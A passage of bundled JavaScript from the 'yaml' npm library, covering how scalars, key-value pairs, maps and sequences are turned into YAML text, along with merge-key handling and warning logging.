            if (implicitKey || json2[i + 2] === '"' || json2.length < minMultiLineLength) {
              i += 1;
            } else {
              str += json2.slice(start, i) + `

`;
              while (json2[i + 2] === "\\" && json2[i + 3] === "n" && json2[i + 4] !== '"') {
                str += `
`;
                i += 2;
              }
              str += indent;
              if (json2[i + 2] === " ")
                str += "\\";
              i += 1;
              start = i + 1;
            }
            break;
          default:
            i += 1;
        }
    }
    str = start ? str + json2.slice(start) : json2;
    return implicitKey ? str : foldFlowLines.foldFlowLines(str, indent, foldFlowLines.FOLD_QUOTED, getFoldOptions(ctx, false));
  }
  function singleQuotedString(value, ctx) {
    if (ctx.options.singleQuote === false || ctx.implicitKey && value.includes(`
`) || /[ \t]\n|\n[ \t]/.test(value))
      return doubleQuotedString(value, ctx);
    const indent = ctx.indent || (containsDocumentMarker(value) ? "  " : "");
    const res = "'" + value.replace(/'/g, "''").replace(/\n+/g, `$&
${indent}`) + "'";
    return ctx.implicitKey ? res : foldFlowLines.foldFlowLines(res, indent, foldFlowLines.FOLD_FLOW, getFoldOptions(ctx, false));
  }
  function quotedString(value, ctx) {
    const { singleQuote } = ctx.options;
    let qs;
    if (singleQuote === false)
      qs = doubleQuotedString;
    else {
      const hasDouble = value.includes('"');
      const hasSingle = value.includes("'");
      if (hasDouble && !hasSingle)
        qs = singleQuotedString;
      else if (hasSingle && !hasDouble)
        qs = doubleQuotedString;
      else
        qs = singleQuote ? singleQuotedString : doubleQuotedString;
    }
    return qs(value, ctx);
  }
  var blockEndNewlines;
  try {
    blockEndNewlines = new RegExp(`(^|(?<!
))
+(?!
|$)`, "g");
  } catch {
    blockEndNewlines = /\n+(?!\n|$)/g;
  }
  function blockString({ comment, type, value }, ctx, onComment, onChompKeep) {
    const { blockQuote, commentString, lineWidth } = ctx.options;
    if (!blockQuote || /\n[\t ]+$/.test(value)) {
      return quotedString(value, ctx);
    }
    const indent = ctx.indent || (ctx.forceBlockIndent || containsDocumentMarker(value) ? "  " : "");
    const literal2 = blockQuote === "literal" ? true : blockQuote === "folded" || type === Scalar.Scalar.BLOCK_FOLDED ? false : type === Scalar.Scalar.BLOCK_LITERAL ? true : !lineLengthOverLimit(value, lineWidth, indent.length);
    if (!value)
      return literal2 ? `|
` : `>
`;
    let chomp;
    let endStart;
    for (endStart = value.length;endStart > 0; --endStart) {
      const ch = value[endStart - 1];
      if (ch !== `
` && ch !== "\t" && ch !== " ")
        break;
    }
    let end = value.substring(endStart);
    const endNlPos = end.indexOf(`
`);
    if (endNlPos === -1) {
      chomp = "-";
    } else if (value === end || endNlPos !== end.length - 1) {
      chomp = "+";
      if (onChompKeep)
        onChompKeep();
    } else {
      chomp = "";
    }
    if (end) {
      value = value.slice(0, -end.length);
      if (end[end.length - 1] === `
`)
        end = end.slice(0, -1);
      end = end.replace(blockEndNewlines, `$&${indent}`);
    }
    let startWithSpace = false;
    let startEnd;
    let startNlPos = -1;
    for (startEnd = 0;startEnd < value.length; ++startEnd) {
      const ch = value[startEnd];
      if (ch === " ")
        startWithSpace = true;
      else if (ch === `
`)
        startNlPos = startEnd;
      else
        break;
    }
    let start = value.substring(0, startNlPos < startEnd ? startNlPos + 1 : startEnd);
    if (start) {
      value = value.substring(start.length);
      start = start.replace(/\n+/g, `$&${indent}`);
    }
    const indentSize = indent ? "2" : "1";
    let header = (startWithSpace ? indentSize : "") + chomp;
    if (comment) {
      header += " " + commentString(comment.replace(/ ?[\r\n]+/g, " "));
      if (onComment)
        onComment();
    }
    if (!literal2) {
      const foldedValue = value.replace(/\n+/g, `
$&`).replace(/(?:^|\n)([\t ].*)(?:([\n\t ]*)\n(?![\n\t ]))?/g, "$1$2").replace(/\n+/g, `$&${indent}`);
      let literalFallback = false;
      const foldOptions = getFoldOptions(ctx, true);
      if (blockQuote !== "folded" && type !== Scalar.Scalar.BLOCK_FOLDED) {
        foldOptions.onOverflow = () => {
          literalFallback = true;
        };
      }
      const body = foldFlowLines.foldFlowLines(`${start}${foldedValue}${end}`, indent, foldFlowLines.FOLD_BLOCK, foldOptions);
      if (!literalFallback)
        return `>${header}
${indent}${body}`;
    }
    value = value.replace(/\n+/g, `$&${indent}`);
    return `|${header}
${indent}${start}${value}${end}`;
  }
  function plainString(item, ctx, onComment, onChompKeep) {
    const { type, value } = item;
    const { actualString, implicitKey, indent, indentStep, inFlow } = ctx;
    if (implicitKey && value.includes(`
`) || inFlow && /[[\]{},]/.test(value)) {
      return quotedString(value, ctx);
    }
    if (/^[\n\t ,[\]{}#&*!|>'"%@`]|^[?-]$|^[?-][ \t]|[\n:][ \t]|[ \t]\n|[\n\t ]#|[\n\t :]$/.test(value)) {
      return implicitKey || inFlow || !value.includes(`
`) ? quotedString(value, ctx) : blockString(item, ctx, onComment, onChompKeep);
    }
    if (!implicitKey && !inFlow && type !== Scalar.Scalar.PLAIN && value.includes(`
`)) {
      return blockString(item, ctx, onComment, onChompKeep);
    }
    if (containsDocumentMarker(value)) {
      if (indent === "") {
        ctx.forceBlockIndent = true;
        return blockString(item, ctx, onComment, onChompKeep);
      } else if (implicitKey && indent === indentStep) {
        return quotedString(value, ctx);
      }
    }
    const str = value.replace(/\n+/g, `$&
${indent}`);
    if (actualString) {
      const test = (tag) => tag.default && tag.tag !== "tag:yaml.org,2002:str" && tag.test?.test(str);
      const { compat: compat2, tags } = ctx.doc.schema;
      if (tags.some(test) || compat2?.some(test))
        return quotedString(value, ctx);
    }
    return implicitKey ? str : foldFlowLines.foldFlowLines(str, indent, foldFlowLines.FOLD_FLOW, getFoldOptions(ctx, false));
  }
  function stringifyString(item, ctx, onComment, onChompKeep) {
    const { implicitKey, inFlow } = ctx;
    const ss = typeof item.value === "string" ? item : Object.assign({}, item, { value: String(item.value) });
    let { type } = item;
    if (type !== Scalar.Scalar.QUOTE_DOUBLE) {
      if (/[\x00-\x08\x0b-\x1f\x7f-\x9f\u{D800}-\u{DFFF}]/u.test(ss.value))
        type = Scalar.Scalar.QUOTE_DOUBLE;
    }
    const _stringify = (_type) => {
      switch (_type) {
        case Scalar.Scalar.BLOCK_FOLDED:
        case Scalar.Scalar.BLOCK_LITERAL:
          return implicitKey || inFlow ? quotedString(ss.value, ctx) : blockString(ss, ctx, onComment, onChompKeep);
        case Scalar.Scalar.QUOTE_DOUBLE:
          return doubleQuotedString(ss.value, ctx);
        case Scalar.Scalar.QUOTE_SINGLE:
          return singleQuotedString(ss.value, ctx);
        case Scalar.Scalar.PLAIN:
          return plainString(ss, ctx, onComment, onChompKeep);
        default:
          return null;
      }
    };
    let res = _stringify(type);
    if (res === null) {
      const { defaultKeyType, defaultStringType } = ctx.options;
      const t = implicitKey && defaultKeyType || defaultStringType;
      res = _stringify(t);
      if (res === null)
        throw new Error(`Unsupported default string type ${t}`);
    }
    return res;
  }
  exports.stringifyString = stringifyString;
});

// node_modules/yaml/dist/stringify/stringify.js
var require_stringify = __commonJS((exports) => {
  var anchors = require_anchors();
  var identity = require_identity();
  var stringifyComment = require_stringifyComment();
  var stringifyString = require_stringifyString();
  function createStringifyContext(doc2, options) {
    const opt = Object.assign({
      blockQuote: true,
      commentString: stringifyComment.stringifyComment,
      defaultKeyType: null,
      defaultStringType: "PLAIN",
      directives: null,
      doubleQuotedAsJSON: false,
      doubleQuotedMinMultiLineLength: 40,
      falseStr: "false",
      flowCollectionPadding: true,
      indentSeq: true,
      lineWidth: 80,
      minContentWidth: 20,
      nullStr: "null",
      simpleKeys: false,
      singleQuote: null,
      trueStr: "true",
      verifyAliasOrder: true
    }, doc2.schema.toStringOptions, options);
    let inFlow;
    switch (opt.collectionStyle) {
      case "block":
        inFlow = false;
        break;
      case "flow":
        inFlow = true;
        break;
      default:
        inFlow = null;
    }
    return {
      anchors: new Set,
      doc: doc2,
      flowCollectionPadding: opt.flowCollectionPadding ? " " : "",
      indent: "",
      indentStep: typeof opt.indent === "number" ? " ".repeat(opt.indent) : "  ",
      inFlow,
      options: opt
    };
  }
  function getTagObject(tags, item) {
    if (item.tag) {
      const match = tags.filter((t) => t.tag === item.tag);
      if (match.length > 0)
        return match.find((t) => t.format === item.format) ?? match[0];
    }
    let tagObj = undefined;
    let obj;
    if (identity.isScalar(item)) {
      obj = item.value;
      let match = tags.filter((t) => t.identify?.(obj));
      if (match.length > 1) {
        const testMatch = match.filter((t) => t.test);
        if (testMatch.length > 0)
          match = testMatch;
      }
      tagObj = match.find((t) => t.format === item.format) ?? match.find((t) => !t.format);
    } else {
      obj = item;
      tagObj = tags.find((t) => t.nodeClass && obj instanceof t.nodeClass);
    }
    if (!tagObj) {
      const name = obj?.constructor?.name ?? (obj === null ? "null" : typeof obj);
      throw new Error(`Tag not resolved for ${name} value`);
    }
    return tagObj;
  }
  function stringifyProps(node, tagObj, { anchors: anchors$1, doc: doc2 }) {
    if (!doc2.directives)
      return "";
    const props = [];
    const anchor = (identity.isScalar(node) || identity.isCollection(node)) && node.anchor;
    if (anchor && anchors.anchorIsValid(anchor)) {
      anchors$1.add(anchor);
      props.push(`&${anchor}`);
    }
    const tag = node.tag ?? (tagObj.default ? null : tagObj.tag);
    if (tag)
      props.push(doc2.directives.tagString(tag));
    return props.join(" ");
  }
  function stringify(item, ctx, onComment, onChompKeep) {
    if (identity.isPair(item))
      return item.toString(ctx, onComment, onChompKeep);
    if (identity.isAlias(item)) {
      if (ctx.doc.directives)
        return item.toString(ctx);
      if (ctx.resolvedAliases?.has(item)) {
        throw new TypeError(`Cannot stringify circular structure without alias nodes`);
      } else {
        if (ctx.resolvedAliases)
          ctx.resolvedAliases.add(item);
        else
          ctx.resolvedAliases = new Set([item]);
        item = item.resolve(ctx.doc);
      }
    }
    let tagObj = undefined;
    const node = identity.isNode(item) ? item : ctx.doc.createNode(item, { onTagObj: (o) => tagObj = o });
    tagObj ?? (tagObj = getTagObject(ctx.doc.schema.tags, node));
    const props = stringifyProps(node, tagObj, ctx);
    if (props.length > 0)
      ctx.indentAtStart = (ctx.indentAtStart ?? 0) + props.length + 1;
    const str = typeof tagObj.stringify === "function" ? tagObj.stringify(node, ctx, onComment, onChompKeep) : identity.isScalar(node) ? stringifyString.stringifyString(node, ctx, onComment, onChompKeep) : node.toString(ctx, onComment, onChompKeep);
    if (!props)
      return str;
    return identity.isScalar(node) || str[0] === "{" || str[0] === "[" ? `${props} ${str}` : `${props}
${ctx.indent}${str}`;
  }
  exports.createStringifyContext = createStringifyContext;
  exports.stringify = stringify;
});

// node_modules/yaml/dist/stringify/stringifyPair.js
var require_stringifyPair = __commonJS((exports) => {
  var identity = require_identity();
  var Scalar = require_Scalar();
  var stringify = require_stringify();
  var stringifyComment = require_stringifyComment();
  function stringifyPair({ key, value }, ctx, onComment, onChompKeep) {
    const { allNullValues, doc: doc2, indent, indentStep, options: { commentString, indentSeq, simpleKeys } } = ctx;
    let keyComment = identity.isNode(key) && key.comment || null;
    if (simpleKeys) {
      if (keyComment) {
        throw new Error("With simple keys, key nodes cannot have comments");
      }
      if (identity.isCollection(key) || !identity.isNode(key) && typeof key === "object") {
        const msg = "With simple keys, collection cannot be used as a key value";
        throw new Error(msg);
      }
    }
    let explicitKey = !simpleKeys && (!key || keyComment && value == null && !ctx.inFlow || identity.isCollection(key) || (identity.isScalar(key) ? key.type === Scalar.Scalar.BLOCK_FOLDED || key.type === Scalar.Scalar.BLOCK_LITERAL : typeof key === "object"));
    ctx = Object.assign({}, ctx, {
      allNullValues: false,
      implicitKey: !explicitKey && (simpleKeys || !allNullValues),
      indent: indent + indentStep
    });
    let keyCommentDone = false;
    let chompKeep = false;
    let str = stringify.stringify(key, ctx, () => keyCommentDone = true, () => chompKeep = true);
    if (!explicitKey && !ctx.inFlow && str.length > 1024) {
      if (simpleKeys)
        throw new Error("With simple keys, single line scalar must not span more than 1024 characters");
      explicitKey = true;
    }
    if (ctx.inFlow) {
      if (allNullValues || value == null) {
        if (keyCommentDone && onComment)
          onComment();
        return str === "" ? "?" : explicitKey ? `? ${str}` : str;
      }
    } else if (allNullValues && !simpleKeys || value == null && explicitKey) {
      str = `? ${str}`;
      if (keyComment && !keyCommentDone) {
        str += stringifyComment.lineComment(str, ctx.indent, commentString(keyComment));
      } else if (chompKeep && onChompKeep)
        onChompKeep();
      return str;
    }
    if (keyCommentDone)
      keyComment = null;
    if (explicitKey) {
      if (keyComment)
        str += stringifyComment.lineComment(str, ctx.indent, commentString(keyComment));
      str = `? ${str}
${indent}:`;
    } else {
      str = `${str}:`;
      if (keyComment)
        str += stringifyComment.lineComment(str, ctx.indent, commentString(keyComment));
    }
    let vsb, vcb, valueComment;
    if (identity.isNode(value)) {
      vsb = !!value.spaceBefore;
      vcb = value.commentBefore;
      valueComment = value.comment;
    } else {
      vsb = false;
      vcb = null;
      valueComment = null;
      if (value && typeof value === "object")
        value = doc2.createNode(value);
    }
    ctx.implicitKey = false;
    if (!explicitKey && !keyComment && identity.isScalar(value))
      ctx.indentAtStart = str.length + 1;
    chompKeep = false;
    if (!indentSeq && indentStep.length >= 2 && !ctx.inFlow && !explicitKey && identity.isSeq(value) && !value.flow && !value.tag && !value.anchor) {
      ctx.indent = ctx.indent.substring(2);
    }
    let valueCommentDone = false;
    const valueStr = stringify.stringify(value, ctx, () => valueCommentDone = true, () => chompKeep = true);
    let ws = " ";
    if (keyComment || vsb || vcb) {
      ws = vsb ? `
` : "";
      if (vcb) {
        const cs = commentString(vcb);
        ws += `
${stringifyComment.indentComment(cs, ctx.indent)}`;
      }
      if (valueStr === "" && !ctx.inFlow) {
        if (ws === `
` && valueComment)
          ws = `

`;
      } else {
        ws += `
${ctx.indent}`;
      }
    } else if (!explicitKey && identity.isCollection(value)) {
      const vs0 = valueStr[0];
      const nl0 = valueStr.indexOf(`
`);
      const hasNewline = nl0 !== -1;
      const flow = ctx.inFlow ?? value.flow ?? value.items.length === 0;
      if (hasNewline || !flow) {
        let hasPropsLine = false;
        if (hasNewline && (vs0 === "&" || vs0 === "!")) {
          let sp0 = valueStr.indexOf(" ");
          if (vs0 === "&" && sp0 !== -1 && sp0 < nl0 && valueStr[sp0 + 1] === "!") {
            sp0 = valueStr.indexOf(" ", sp0 + 1);
          }
          if (sp0 === -1 || nl0 < sp0)
            hasPropsLine = true;
        }
        if (!hasPropsLine)
          ws = `
${ctx.indent}`;
      }
    } else if (valueStr === "" || valueStr[0] === `
`) {
      ws = "";
    }
    str += ws + valueStr;
    if (ctx.inFlow) {
      if (valueCommentDone && onComment)
        onComment();
    } else if (valueComment && !valueCommentDone) {
      str += stringifyComment.lineComment(str, ctx.indent, commentString(valueComment));
    } else if (chompKeep && onChompKeep) {
      onChompKeep();
    }
    return str;
  }
  exports.stringifyPair = stringifyPair;
});

// node_modules/yaml/dist/log.js
var require_log = __commonJS((exports) => {
  var node_process = __require("process");
  function debug(logLevel, ...messages) {
    if (logLevel === "debug")
      console.log(...messages);
  }
  function warn(logLevel, warning) {
    if (logLevel === "debug" || logLevel === "warn") {
      if (typeof node_process.emitWarning === "function")
        node_process.emitWarning(warning);
      else
        console.warn(warning);
    }
  }
  exports.debug = debug;
  exports.warn = warn;
});

// node_modules/yaml/dist/schema/yaml-1.1/merge.js
var require_merge = __commonJS((exports) => {
  var identity = require_identity();
  var Scalar = require_Scalar();
  var MERGE_KEY = "<<";
  var merge2 = {
    identify: (value) => value === MERGE_KEY || typeof value === "symbol" && value.description === MERGE_KEY,
    default: "key",
    tag: "tag:yaml.org,2002:merge",
    test: /^<<$/,
    resolve: () => Object.assign(new Scalar.Scalar(Symbol(MERGE_KEY)), {
      addToJSMap: addMergeToJSMap
    }),
    stringify: () => MERGE_KEY
  };
  var isMergeKey = (ctx, key) => (merge2.identify(key) || identity.isScalar(key) && (!key.type || key.type === Scalar.Scalar.PLAIN) && merge2.identify(key.value)) && ctx?.doc.schema.tags.some((tag) => tag.tag === merge2.tag && tag.default);
  function addMergeToJSMap(ctx, map2, value) {
    value = ctx && identity.isAlias(value) ? value.resolve(ctx.doc) : value;
    if (identity.isSeq(value))
      for (const it of value.items)
        mergeValue(ctx, map2, it);
    else if (Array.isArray(value))
      for (const it of value)
        mergeValue(ctx, map2, it);
    else
      mergeValue(ctx, map2, value);
  }
  function mergeValue(ctx, map2, value) {
    const source = ctx && identity.isAlias(value) ? value.resolve(ctx.doc) : value;
    if (!identity.isMap(source))
      throw new Error("Merge sources must be maps or map aliases");
    const srcMap = source.toJSON(null, ctx, Map);
    for (const [key, value2] of srcMap) {
      if (map2 instanceof Map) {
        if (!map2.has(key))
          map2.set(key, value2);
      } else if (map2 instanceof Set) {
        map2.add(key);
      } else if (!Object.prototype.hasOwnProperty.call(map2, key)) {
        Object.defineProperty(map2, key, {
          value: value2,
          writable: true,
          enumerable: true,
          configurable: true
        });
      }
    }
    return map2;
  }
  exports.addMergeToJSMap = addMergeToJSMap;
  exports.isMergeKey = isMergeKey;
  exports.merge = merge2;
});

// node_modules/yaml/dist/nodes/addPairToJSMap.js
var require_addPairToJSMap = __commonJS((exports) => {
  var log = require_log();
  var merge2 = require_merge();
  var stringify = require_stringify();
  var identity = require_identity();
  var toJS = require_toJS();
  function addPairToJSMap(ctx, map2, { key, value }) {
    if (identity.isNode(key) && key.addToJSMap)
      key.addToJSMap(ctx, map2, value);
    else if (merge2.isMergeKey(ctx, key))
      merge2.addMergeToJSMap(ctx, map2, value);
    else {
      const jsKey = toJS.toJS(key, "", ctx);
      if (map2 instanceof Map) {
        map2.set(jsKey, toJS.toJS(value, jsKey, ctx));
      } else if (map2 instanceof Set) {
        map2.add(jsKey);
      } else {
        const stringKey = stringifyKey(key, jsKey, ctx);
        const jsValue = toJS.toJS(value, stringKey, ctx);
        if (stringKey in map2)
          Object.defineProperty(map2, stringKey, {
            value: jsValue,
            writable: true,
            enumerable: true,
            configurable: true
          });
        else
          map2[stringKey] = jsValue;
      }
    }
    return map2;
  }
  function stringifyKey(key, jsKey, ctx) {
    if (jsKey === null)
      return "";
    if (typeof jsKey !== "object")
      return String(jsKey);
    if (identity.isNode(key) && ctx?.doc) {
      const strCtx = stringify.createStringifyContext(ctx.doc, {});
      strCtx.anchors = new Set;
      for (const node of ctx.anchors.keys())
        strCtx.anchors.add(node.anchor);
      strCtx.inFlow = true;
      strCtx.inStringifyKey = true;
      const strKey = key.toString(strCtx);
      if (!ctx.mapKeyWarned) {
        let jsonStr = JSON.stringify(strKey);
        if (jsonStr.length > 40)
          jsonStr = jsonStr.substring(0, 36) + '..."';
        log.warn(ctx.doc.options.logLevel, `Keys with collection values will be stringified due to JS Object restrictions: ${jsonStr}. Set mapAsMap: true to use object keys.`);
        ctx.mapKeyWarned = true;
      }
      return strKey;
    }
    return JSON.stringify(jsKey);
  }
  exports.addPairToJSMap = addPairToJSMap;
});

// node_modules/yaml/dist/nodes/Pair.js
var require_Pair = __commonJS((exports) => {
  var createNode = require_createNode();
  var stringifyPair = require_stringifyPair();
  var addPairToJSMap = require_addPairToJSMap();
  var identity = require_identity();
  function createPair(key, value, ctx) {
    const k = createNode.createNode(key, undefined, ctx);
    const v = createNode.createNode(value, undefined, ctx);
    return new Pair(k, v);
  }

  class Pair {
    constructor(key, value = null) {
      Object.defineProperty(this, identity.NODE_TYPE, { value: identity.PAIR });
      this.key = key;
      this.value = value;
    }
    clone(schema) {
      let { key, value } = this;
      if (identity.isNode(key))
        key = key.clone(schema);
      if (identity.isNode(value))
        value = value.clone(schema);
      return new Pair(key, value);
    }
    toJSON(_, ctx) {
      const pair = ctx?.mapAsMap ? new Map : {};
      return addPairToJSMap.addPairToJSMap(ctx, pair, this);
    }
    toString(ctx, onComment, onChompKeep) {
      return ctx?.doc ? stringifyPair.stringifyPair(this, ctx, onComment, onChompKeep) : JSON.stringify(this);
    }
  }
  exports.Pair = Pair;
  exports.createPair = createPair;
});

// node_modules/yaml/dist/stringify/stringifyCollection.js
var require_stringifyCollection = __commonJS((exports) => {
  var identity = require_identity();
  var stringify = require_stringify();
  var stringifyComment = require_stringifyComment();
  function stringifyCollection(collection, ctx, options) {
    const flow = ctx.inFlow ?? collection.flow;
    const stringify2 = flow ? stringifyFlowCollection : stringifyBlockCollection;
    return stringify2(collection, ctx, options);
  }
  function stringifyBlockCollection({ comment, items }, ctx, { blockItemPrefix, flowChars, itemIndent, onChompKeep, onComment }) {
    const { indent, options: { commentString } } = ctx;
    const itemCtx = Object.assign({}, ctx, { indent: itemIndent, type: null });
    let chompKeep = false;
    const lines = [];
    for (let i = 0;i < items.length; ++i) {
      const item = items[i];
      let comment2 = null;
      if (identity.isNode(item)) {
        if (!chompKeep && item.spaceBefore)
          lines.push("");
        addCommentBefore(ctx, lines, item.commentBefore, chompKeep);
        if (item.comment)
          comment2 = item.comment;
      } else if (identity.isPair(item)) {
        const ik = identity.isNode(item.key) ? item.key : null;
        if (ik) {
          if (!chompKeep && ik.spaceBefore)
            lines.push("");
          addCommentBefore(ctx, lines, ik.commentBefore, chompKeep);
        }
      }
      chompKeep = false;
      let str2 = stringify.stringify(item, itemCtx, () => comment2 = null, () => chompKeep = true);
      if (comment2)
        str2 += stringifyComment.lineComment(str2, itemIndent, commentString(comment2));
      if (chompKeep && comment2)
        chompKeep = false;
      lines.push(blockItemPrefix + str2);
    }
    let str;
    if (lines.length === 0) {
      str = flowChars.start + flowChars.end;
    } else {
      str = lines[0];
      for (let i = 1;i < lines.length; ++i) {
        const line = lines[i];
        str += line ? `
${indent}${line}` : `
`;
      }
    }
    if (comment) {
      str += `
` + stringifyComment.indentComment(commentString(comment), indent);
      if (onComment)
        onComment();
    } else if (chompKeep && onChompKeep)
      onChompKeep();
    return str;
  }
  function stringifyFlowCollection({ items }, ctx, { flowChars, itemIndent }) {
    const { indent, indentStep, flowCollectionPadding: fcPadding, options: { commentString } } = ctx;
    itemIndent += indentStep;
    const itemCtx = Object.assign({}, ctx, {
      indent: itemIndent,
      inFlow: true,
      type: null
    });
    let reqNewline = false;
    let linesAtValue = 0;
    const lines = [];
    for (let i = 0;i < items.length; ++i) {
      const item = items[i];
      let comment = null;
      if (identity.isNode(item)) {
        if (item.spaceBefore)
          lines.push("");
        addCommentBefore(ctx, lines, item.commentBefore, false);
        if (item.comment)
          comment = item.comment;
      } else if (identity.isPair(item)) {
        const ik = identity.isNode(item.key) ? item.key : null;
        if (ik) {
          if (ik.spaceBefore)
            lines.push("");
          addCommentBefore(ctx, lines, ik.commentBefore, false);
          if (ik.comment)
            reqNewline = true;
        }
        const iv = identity.isNode(item.value) ? item.value : null;
        if (iv) {
          if (iv.comment)
            comment = iv.comment;
          if (iv.commentBefore)
            reqNewline = true;
        } else if (item.value == null && ik?.comment) {
          comment = ik.comment;
        }
      }
      if (comment)
        reqNewline = true;
      let str = stringify.stringify(item, itemCtx, () => comment = null);
      if (i < items.length - 1)
        str += ",";
      if (comment)
        str += stringifyComment.lineComment(str, itemIndent, commentString(comment));
      if (!reqNewline && (lines.length > linesAtValue || str.includes(`
`)))
        reqNewline = true;
      lines.push(str);
      linesAtValue = lines.length;
    }
    const { start, end } = flowChars;
    if (lines.length === 0) {
      return start + end;
    } else {
      if (!reqNewline) {
        const len = lines.reduce((sum, line) => sum + line.length + 2, 2);
        reqNewline = ctx.options.lineWidth > 0 && len > ctx.options.lineWidth;
      }
      if (reqNewline) {
        let str = start;
        for (const line of lines)
          str += line ? `
${indentStep}${indent}${line}` : `
`;
        return `${str}
${indent}${end}`;
      } else {
        return `${start}${fcPadding}${lines.join(" ")}${fcPadding}${end}`;
      }
    }
  }
  function addCommentBefore({ indent, options: { commentString } }, lines, comment, chompKeep) {
    if (comment && chompKeep)
      comment = comment.replace(/^\n+/, "");
    if (comment) {
      const ic = stringifyComment.indentComment(commentString(comment), indent);
      lines.push(ic.trimStart());
    }
  }
  exports.stringifyCollection = stringifyCollection;
});

// node_modules/yaml/dist/nodes/YAMLMap.js
var require_YAMLMap = __commonJS((exports) => {
  var stringifyCollection = require_stringifyCollection();
  var addPairToJSMap = require_addPairToJSMap();
  var Collection = require_Collection();
  var identity = require_identity();
  var Pair = require_Pair();
  var Scalar = require_Scalar();
  function findPair(items, key) {
    const k = identity.isScalar(key) ? key.value : key;
    for (const it of items) {
      if (identity.isPair(it)) {
        if (it.key === key || it.key === k)
          return it;
        if (identity.isScalar(it.key) && it.key.value === k)
          return it;
      }
    }
    return;
  }

  class YAMLMap extends Collection.Collection {
    static get tagName() {
      return "tag:yaml.org,2002:map";
    }
    constructor(schema) {
      super(identity.MAP, schema);
      this.items = [];
    }
    static from(schema, obj, ctx) {
      const { keepUndefined, replacer } = ctx;
      const map2 = new this(schema);
      const add = (key, value) => {
        if (typeof replacer === "function")
          value = replacer.call(obj, key, value);
        else if (Array.isArray(replacer) && !replacer.includes(key))
          return;
        if (value !== undefined || keepUndefined)
          map2.items.push(Pair.createPair(key, value, ctx));
      };
      if (obj instanceof Map) {
        for (const [key, value] of obj)
          add(key, value);
      } else if (obj && typeof obj === "object") {
        for (const key of Object.keys(obj))
          add(key, obj[key]);
      }
      if (typeof schema.sortMapEntries === "function") {
        map2.items.sort(schema.sortMapEntries);
      }
      return map2;
    }
    add(pair, overwrite) {
      let _pair;
      if (identity.isPair(pair))
        _pair = pair;
      else if (!pair || typeof pair !== "object" || !("key" in pair)) {
        _pair = new Pair.Pair(pair, pair?.value);
      } else
        _pair = new Pair.Pair(pair.key, pair.value);
      const prev = findPair(this.items, _pair.key);
      const sortEntries = this.schema?.sortMapEntries;
      if (prev) {
        if (!overwrite)
          throw new Error(`Key ${_pair.key} already set`);
        if (identity.isScalar(prev.value) && Scalar.isScalarValue(_pair.value))
          prev.value.value = _pair.value;
        else
          prev.value = _pair.value;
      } else if (sortEntries) {
        const i = this.items.findIndex((item) => sortEntries(_pair, item) < 0);
        if (i === -1)
          this.items.push(_pair);
        else
          this.items.splice(i, 0, _pair);
      } else {
        this.items.push(_pair);
      }
    }
    delete(key) {
      const it = findPair(this.items, key);
      if (!it)
        return false;
      const del = this.items.splice(this.items.indexOf(it), 1);
      return del.length > 0;
    }
    get(key, keepScalar) {
      const it = findPair(this.items, key);
      const node = it?.value;
      return (!keepScalar && identity.isScalar(node) ? node.value : node) ?? undefined;
    }
    has(key) {
      return !!findPair(this.items, key);
    }
    set(key, value) {
      this.add(new Pair.Pair(key, value), true);
    }
    toJSON(_, ctx, Type) {
      const map2 = Type ? new Type : ctx?.mapAsMap ? new Map : {};
      if (ctx?.onCreate)
        ctx.onCreate(map2);
      for (const item of this.items)
        addPairToJSMap.addPairToJSMap(ctx, map2, item);
      return map2;
    }
    toString(ctx, onComment, onChompKeep) {
      if (!ctx)
        return JSON.stringify(this);
      for (const item of this.items) {
        if (!identity.isPair(item))
          throw new Error(`Map items must all be pairs; found ${JSON.stringify(item)} instead`);
      }
      if (!ctx.allNullValues && this.hasAllNullValues(false))
        ctx = Object.assign({}, ctx, { allNullValues: true });
      return stringifyCollection.stringifyCollection(this, ctx, {
        blockItemPrefix: "",
        flowChars: { start: "{", end: "}" },
        itemIndent: ctx.indent || "",
        onChompKeep,
        onComment
      });
    }
  }
  exports.YAMLMap = YAMLMap;
  exports.findPair = findPair;
});

// node_modules/yaml/dist/schema/common/map.js
var require_map = __commonJS((exports) => {
  var identity = require_identity();
  var YAMLMap = require_YAMLMap();
  var map2 = {
    collection: "map",
    default: true,
    nodeClass: YAMLMap.YAMLMap,
    tag: "tag:yaml.org,2002:map",
    resolve(map3, onError) {
      if (!identity.isMap(map3))
        onError("Expected a mapping for this tag");
      return map3;
    },
    createNode: (schema, obj, ctx) => YAMLMap.YAMLMap.from(schema, obj, ctx)
  };
  exports.map = map2;
});

// node_modules/yaml/dist/nodes/YAMLSeq.js
var require_YAMLSeq = __commonJS((exports) => {
  var createNode = require_createNode();
  var stringifyCollection = require_stringifyCollection();
  var Collection = require_Collection();
  var identity = require_identity();
  var Scalar = require_Scalar();
  var toJS = require_toJS();

  class YAMLSeq extends Collection.Collection {
    static get tagName() {
      return "tag:yaml.org,2002:seq";
    }
    constructor(schema) {
      super(identity.SEQ, schema);
      this.items = [];
    }
    add(value) {
      this.items.push(value);
    }
    delete(key) {
      const idx = asItemIndex(key);
      if (typeof idx !== "number")
        return false;
      const del = this.items.splice(idx, 1);
      return del.length > 0;
    }
    get(key, keepScalar) {
      const idx = asItemIndex(key);
      if (typeof idx !== "number")
        return;
      const it = this.items[idx];
      return !keepScalar && identity.isScalar(it) ? it.value : it;
    }
    has(key) {
      const idx = asItemIndex(key);
      return typeof idx === "number" && idx < this.items.length;
    }
    set(key, value) {
      const idx = asItemIndex(key);
      if (typeof idx !== "number")
        throw new Error(`Expected a valid index, not ${key}.`);
      const prev = this.items[idx];
      if (identity.isScalar(prev) && Scalar.isScalarValue(value))
        prev.value = value;
      else
        this.items[idx] = value;
    }
    toJSON(_, ctx) {
      const seq = [];
      if (ctx?.onCreate)
        ctx.onCreate(seq);
      let i = 0;
      for (const item of this.items)
        seq.push(toJS.toJS(item, String(i++), ctx));
      return seq;
    }
    toString(ctx, onComment, onChompKeep) {
      if (!ctx)
        return JSON.stringify(this);
      return stringifyCollection.stringifyCollection(this, ctx, {
        blockItemPrefix: "- ",
        flowChars: { start: "[", end: "]" },
        itemIndent: (ctx.indent || "") + "  ",
        onChompKeep,
        onComment
      });
    }
    static from(schema, obj, ctx) {
      const { replacer } = ctx;
      const seq = new this(schema);
      if (obj && Symbol.iterator in Object(obj)) {
        let i = 0;
        for (let it of obj) {
          if (typeof replacer === "function") {
            const key = obj instanceof Set ? it : String(i++);
            it = replacer.call(obj, key, it);
          }
          seq.items.push(createNode.createNode(it, undefined, ctx));
        }
      }
      return seq;
    }
  }
  function asItemIndex(key) {
    let idx = identity.isScalar(key) ? key.value : key;
    if (idx && typeof idx === "string")
      idx = Number(idx);
